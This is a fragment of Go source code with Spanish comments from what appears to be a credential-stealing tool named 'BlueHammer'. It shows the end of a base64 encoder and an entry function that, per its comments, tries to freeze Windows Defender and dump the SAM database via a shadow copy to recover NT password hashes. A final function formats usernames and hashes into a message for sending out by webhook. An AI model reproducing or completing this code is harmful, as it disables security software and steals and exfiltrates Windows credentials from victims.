		if n > 1 {
			result = append(result, chars[(b[1]&0xf)<<2|b[2]>>6])
		} else {
			result = append(result, '=')
		}
		if n > 2 {
			result = append(result, chars[b[2]&0x3f])
		} else {
			result = append(result, '=')
		}
	}
	return string(result)
}

// RunBlueHammer — punto de entrada principal de BlueHammer
// Ejecuta todas las técnicas disponibles y retorna credenciales encontradas
func RunBlueHammer() (credentials []SAMEntry, wdFrozen bool) {
	// 1. Intentar freezar WD y dumpear SAM
	entries, err := RunBlueHammerVSSDump()
	if err == nil && len(entries) > 0 {
		credentials = entries
		wdFrozen = true
	}

	// 2. Si no hay entradas, al menos reportar lo que tenemos
	return
}

// SAMEntriesToWebhook — formatea los SAM entries para envío por webhook
func SAMEntriesToWebhook(entries []SAMEntry) string {
	if len(entries) == 0 {
		return "No SAM entries found"
	}
	var sb strings.Builder
	sb.WriteString("**[BlueHammer] NT Hash Dump**\n```\n")
	for _, e := range entries {
		hashStr := hex.EncodeToString(e.NTHash)
		sb.WriteString(fmt.Sprintf("%-20s | %s\n", e.Username, hashStr))
	}
	sb.WriteString("```")
	return sb.String()
}
